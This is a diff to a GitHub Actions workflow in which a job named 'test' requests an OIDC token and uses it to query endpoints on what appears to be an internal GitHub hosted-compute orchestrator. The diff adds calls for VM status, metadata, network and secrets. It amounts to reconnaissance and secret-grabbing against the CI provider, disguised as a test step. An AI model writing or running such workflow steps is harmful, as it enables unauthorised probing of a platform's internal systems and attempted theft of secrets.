@@ -7,18 +7,24 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: internal api access
+      - name: internal api dig
         run: |
-          # OIDC token with ro_audience
           OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://hosted-compute-ro")
-          TOKEN=$(echo $OIDC | python3 -m json.tool | grep '"value"' | cut -d'"' -f4)
-          echo "TOKEN_LENGTH: ${#TOKEN}"
+          TOKEN=$(echo $OIDC | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
           
-          # Internal API access karo
-          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1" \
-            -H "Authorization: Bearer $TOKEN" | head -20
+          echo "=== VM/V1 ==="
+          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/status" \
+            -H "Authorization: Bearer $TOKEN"
           
-          # VM details
-          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/info" \
-            -H "Authorization: Bearer $TOKEN" | head -20
+          echo "=== VM METADATA ==="
+          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/metadata" \
+            -H "Authorization: Bearer $TOKEN"
+          
+          echo "=== VM NETWORK ==="
+          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/network" \
+            -H "Authorization: Bearer $TOKEN"
+
+          echo "=== VM SECRETS ==="
+          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/secrets" \
+            -H "Authorization: Bearer $TOKEN"
